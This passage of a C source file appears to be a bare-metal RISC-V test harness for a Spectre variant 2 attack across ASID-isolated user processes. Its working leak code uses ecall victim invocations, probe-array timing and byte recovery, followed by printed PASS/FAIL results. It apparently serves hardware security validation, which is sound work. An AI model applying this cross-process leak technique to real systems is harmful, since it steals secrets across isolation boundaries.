    "  li t0, 0x1800\n"
    "  csrs mstatus, t0\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  la t0, machine_low_return\n"
    "  jr t0\n");

static U_TEXT void svc_victim(uint64_t idx, volatile uint8_t *probe)
{
  register uint64_t a0 asm("a0") = idx;
  register uint64_t a1 asm("a1") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_VICTIM;
  asm volatile("ecall" : "+r"(a0) : "r"(a1), "r"(a7) : "memory");
}

static U_TEXT __attribute__((unused)) void svc_flush_probe(volatile uint8_t *probe)
{
  register uint64_t a0 asm("a0") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_FLUSH_PROBE;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
}

static U_TEXT void svc_exit(uint64_t status)
{
  register uint64_t a0 asm("a0") = status;
  register uint64_t a7 asm("a7") = SVC_EXIT;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
  __builtin_unreachable();
}

static U_TEXT void read_byte(char *addr_to_read, uint64_t len)
{
  uint64_t hits[PROBE_ENTRIES];
  uint64_t control_hits[PROBE_ENTRIES];
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    hits[i] = 0;
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    control_hits[i] = 0;

  for (uint64_t warm = 0; warm < V2_BYTE_WARMUP_ROUNDS; ++warm)
#if V2_SERVICE_FLUSH_BEFORE_VICTIM
    svc_flush_probe(shared_probe);
#endif

    svc_victim((uint64_t)addr_to_read, shared_probe);

  for (uint64_t tries = 0; tries < V2_ATTACK_TRIES; ++tries) {
#if V2_ASM_CONTROL_ROUND
    svc_victim(0, shared_probe);

    uint64_t control_seen = 0;
    for (uint64_t i = 0; i < PROBE_ENTRIES && control_seen < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = reload_mix(i, tries);
#if !FULL_BYTE_PROBE
      if (!is_candidate_value(mixed_i))
        continue;
#endif
      if (mixed_i == 0)
        continue;
      control_seen++;
      uint64_t elapsed = u_probe_time(&shared_probe[mixed_i * PROBE_STRIDE]);
      if (elapsed <= active_threshold)
        control_hits[mixed_i]++;
    }
#endif

#if V2_PROBE_CONTROL_ROUND
    svc_flush_probe(shared_probe);

    uint64_t probe_control_seen = 0;
    for (uint64_t i = 0; i < PROBE_ENTRIES && probe_control_seen < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = reload_mix(i, tries);
#if !FULL_BYTE_PROBE
      if (!is_candidate_value(mixed_i))
        continue;
#endif
      if (mixed_i == 0)
        continue;
      probe_control_seen++;
      uint64_t elapsed = u_probe_time(&shared_probe[mixed_i * PROBE_STRIDE]);
      if (elapsed <= active_threshold)
        control_hits[mixed_i]++;
    }
#endif

    svc_victim((uint64_t)addr_to_read, shared_probe);

    uint64_t seen = 0;
    for (uint64_t i = 0; i < PROBE_ENTRIES && seen < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = reload_mix(i, tries);
#if !FULL_BYTE_PROBE
      if (!is_candidate_value(mixed_i))
        continue;
#endif
      if (mixed_i == 0)
        continue;
      seen++;
      uint64_t elapsed = u_probe_time(&shared_probe[mixed_i * PROBE_STRIDE]);
      if (elapsed <= active_threshold)
        hits[mixed_i]++;
    }

    rounds_used[len] = tries + 1;
#if EARLY_STOP
    if (enough_confidence(hits))
      break;
#endif
  }

#if V2_ASM_CONTROL_ROUND || V2_PROBE_CONTROL_ROUND
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    hits[i] = hits[i] > control_hits[i] ? hits[i] - control_hits[i] : 0;
#else
  (void)control_hits;
#endif

  top_two_idx(hits, PROBE_ENTRIES, leaked_idx[len], leaked_score[len]);
  top_four_idx(hits, PROBE_ENTRIES, leaked_top_idx[len], leaked_top_score[len]);
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    leaked_hits[len][i] = hits[i];
}

static U_TEXT __attribute__((unused)) int attacker_run(void)
{
#if SMOKE_AFTER_DIRECT_ONLY
  probe_direct_victim_access();
  return 0x12;
#endif

#if CONTROL_ONLY
#if !SKIP_DIRECT_ISOLATION_CHECK
  probe_direct_victim_access();
#else
  direct_victim_fault_seen = 1;
  direct_victim_read_completed = 0;
#endif
  svc_flush_probe(shared_probe);
#if SMOKE_AFTER_FLUSH_ONLY
  return 0x13;
#endif
  svc_victim((uint64_t)victim_secret, shared_probe);
  return 0;
#endif

#if !SKIP_DIRECT_ISOLATION_CHECK
  probe_direct_victim_access();
#else
  direct_victim_fault_seen = 1;
  direct_victim_read_completed = 0;
#endif

  for (uint64_t len = 0; len < SECRET_SZ; ++len)
    read_byte((char *)&victim_secret[SECRET_OFFSET + len], len);

  return 0;
}

static U_TEXT __attribute__((noreturn, unused)) void attacker_entry(void)
{
#if SMOKE_ENTRY_ONLY
  svc_exit(0x11);
#else
  svc_exit((uint64_t)attacker_run());
#endif
  for (;;)
    asm volatile("wfi");
}

static void enter_attacker_process(void)
{
  uintptr_t user_sp = (uintptr_t)attacker_stack + sizeof(attacker_stack) - 16;
  uintptr_t machine_sp = (uintptr_t)m_stack + sizeof(m_stack) - 16;
  uintptr_t mstatus;

  init_pmp();
  asm volatile("csrw mtvec, %0" :: "r"((uintptr_t)m_trap_entry) : "memory");
  asm volatile("csrw medeleg, zero\ncsrw mideleg, zero" ::: "memory");
  asm volatile("li t0, -1\ncsrw mcounteren, t0\ncsrw scounteren, t0" ::: "t0", "memory");
  install_asid_page_tables();
  observed_attacker_satp = switch_satp(attacker_space.satp, 1);
  asm volatile("mv %0, sp" : "=r"(saved_main_m_sp));

  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~MSTATUS_MPP_MASK) | (0ull << 11);
#if SMOKE_TRACE
  printf("[v2-asid-sv48] pre satp=%lx\n", observed_attacker_satp);
#endif

  asm volatile(
      "csrw mscratch, %[machine_sp]\n"
      "mv sp, %[user_sp]\n"
      "csrw mstatus, %[mstatus]\n"
      "csrw mepc, %[entry]\n"
      "mret\n"
      ".globl machine_low_return\n"
      "machine_low_return:\n"
      "la t0, saved_main_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : [machine_sp] "r"(machine_sp),
        [user_sp] "r"(user_sp),
        [mstatus] "r"(mstatus),
        [entry] "r"((uintptr_t)attacker_entry)
      : "t0", "memory");
}

int main(void)
{
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    shared_probe[i * PROBE_STRIDE] = 1;
  init_v2_target_chain();

#if SMOKE_FAST_BOOT
  uint64_t measured_threshold __attribute__((unused)) = CACHE_HIT_THRESHOLD;
  active_threshold = CACHE_HIT_THRESHOLD;
#else
  uint64_t measured_threshold = xs_calibrate_threshold(shared_probe, PROBE_STRIDE);
  active_threshold = measured_threshold;
#if USE_FIXED_CACHE_HIT_THRESHOLD
  active_threshold = CACHE_HIT_THRESHOLD;
#else
  if (active_threshold == 0)
    active_threshold = CACHE_HIT_THRESHOLD;
#endif
#endif

#if !SMOKE_FAST_BOOT
  printf("[v2-asid-sv48] model=sv48-asid-process-isolation attacker=U victim=U service=machine-scheduler attacker_asid=%lu victim_asid=%lu normalized_attacker_asid=%lu normalized_victim_asid=%lu fence_on_switch=%d baseline_subtract=%d secret_sz=%d candidates=%d tries=%d train=%d warmup=%d asm_control=%d probe_control=%d probe_mix=%d early_strict=%d asm_style=%d flush_lines=%d control_only=%d skip_direct_isolation=%d\n",
         (uint64_t)ATTACKER_ASID, (uint64_t)VICTIM_ASID,
         (uint64_t)ASID16(ATTACKER_ASID), (uint64_t)ASID16(VICTIM_ASID),
         FENCE_ON_ASID_SWITCH, USE_BASELINE_SUBTRACT,
         SECRET_SZ, PROBE_CANDIDATES, V2_ATTACK_TRIES, V2_TRAINING_LOOPS,
         V2_BYTE_WARMUP_ROUNDS, V2_ASM_CONTROL_ROUND, V2_PROBE_CONTROL_ROUND,
         V2_PROBE_MIX, V2_EARLY_STOP_STRICT, V2_ASM_STYLE, FLUSH_LINES, CONTROL_ONLY, SKIP_DIRECT_ISOLATION_CHECK);
  printf("[v2-asid-sv48] secret_offset=%d\n", SECRET_OFFSET);
  printf("[v2-asid-sv48] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v2-asid-sv48] isolation attacker_direct_victim_secret=expect-fault shared_probe=mapped-both victim_data=mapped-victim-only\n");
  printf("[v2-asid-sv48] victim_secret=%p probe=%p gadget=%p safe_target=%p\n",
         victim_secret, shared_probe, v2_asm_gadget, v2_asm_safe);
#endif

  enter_attacker_process();

#if SMOKE_FAST_BOOT
  printf("[v2-asid-sv48] done s=%d t=%lu b=%lu c=%lu n=%d\n",
         attack_status, trap_count, bad_trap_count, last_mcause, SECRET_SZ);
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    printf("[v2-asid-sv48] b%lu e=%02x g=%02x gs=%lu s2=%02x s2s=%lu r=%lu\n",
           i, (uint8_t)victim_secret[SECRET_OFFSET + i],
           leaked_idx[i][0], leaked_score[i][0],
           leaked_idx[i][1], leaked_score[i][1], rounds_used[i]);
  }
  return 0;
#endif

  printf("[v2-asid-sv48] isolation U-direct-victim-read fault_seen=%lu completed=%lu value=0x%02lx u_text=[%p,%p) a_data=[%p,%p) shared=[%p,%p) v_data=[%p,%p)\n",
         direct_victim_fault_seen, direct_victim_read_completed,
         direct_victim_read_value & 0xfful,
         __u_text_start, __u_text_end,
         __a_data_start, __a_data_end,
         __shared_data_start, __shared_data_end,
         __v_data_start, __v_data_end);
  printf("[v2-asid-sv48] satp requested_attacker=0x%lx requested_victim=0x%lx observed_attacker=0x%lx observed_victim=0x%lx asid_mask=0x%lx mode=sv48\n",
         attacker_space.satp, victim_space.satp,
         observed_attacker_satp, observed_victim_satp, SATP_ASID_MASK);
  printf("[v2-asid-sv48] traps=%lu victim_calls=%lu victim_done=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
         trap_count, victim_call_count, victim_done_count, flush_call_count,
         exit_call_count, bad_trap_count, last_mcause, (void *)last_mepc,
         attack_status);

  int leak_ok = 1;
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    uint8_t guess = leaked_idx[i][0];
    uint8_t second = leaked_idx[i][1];
    uint8_t expected = victim_secret[SECRET_OFFSET + i];
    printf("[v2-asid-sv48] byte %lu: expected=%c(0x%02x) guess=%c(0x%02x) score=%lu second=%c(0x%02x) score=%lu\n",
           i,
           expected, expected,
           (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
           (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
    printf("[v2-asid-sv48] byte %lu tries=%lu early_stop=%d min_score=%d gap=%d\n",
           i, rounds_used[i], EARLY_STOP, EARLY_STOP_MIN_SCORE, EARLY_STOP_GAP);
    printf("[v2-asid-sv48] byte %lu top4=%c(0x%02x):%lu,%c(0x%02x):%lu,%c(0x%02x):%lu,%c(0x%02x):%lu\n",
           i,
           (leaked_top_idx[i][0] >= 32 && leaked_top_idx[i][0] < 127) ? leaked_top_idx[i][0] : '?',
           leaked_top_idx[i][0], leaked_top_score[i][0],
           (leaked_top_idx[i][1] >= 32 && leaked_top_idx[i][1] < 127) ? leaked_top_idx[i][1] : '?',
           leaked_top_idx[i][1], leaked_top_score[i][1],
           (leaked_top_idx[i][2] >= 32 && leaked_top_idx[i][2] < 127) ? leaked_top_idx[i][2] : '?',
           leaked_top_idx[i][2], leaked_top_score[i][2],
           (leaked_top_idx[i][3] >= 32 && leaked_top_idx[i][3] < 127) ? leaked_top_idx[i][3] : '?',
           leaked_top_idx[i][3], leaked_top_score[i][3]);
    printf("[v2] byte %lu expected_score=%lu expected_hex=0x%02x\n",
           i, leaked_hits[i][expected], expected);
    (void)second;
    if (guess != expected && second != expected)
      leak_ok = 0;
  }

  int isolation_ok = direct_victim_fault_seen != 0 &&
                     direct_victim_read_completed == 0 &&
                     ((observed_attacker_satp & SATP_ASID_MASK) !=
                      (observed_victim_satp & SATP_ASID_MASK));
  int pass = (attack_status == 0 && bad_trap_count == 0 &&
              victim_call_count != 0 && victim_done_count == victim_call_count &&
              isolation_ok && leak_ok);
  printf("[v2-asid-sv48] check=%s\n", pass ? "PASS" : "FAIL");
  return pass ? 0 : 1;
}
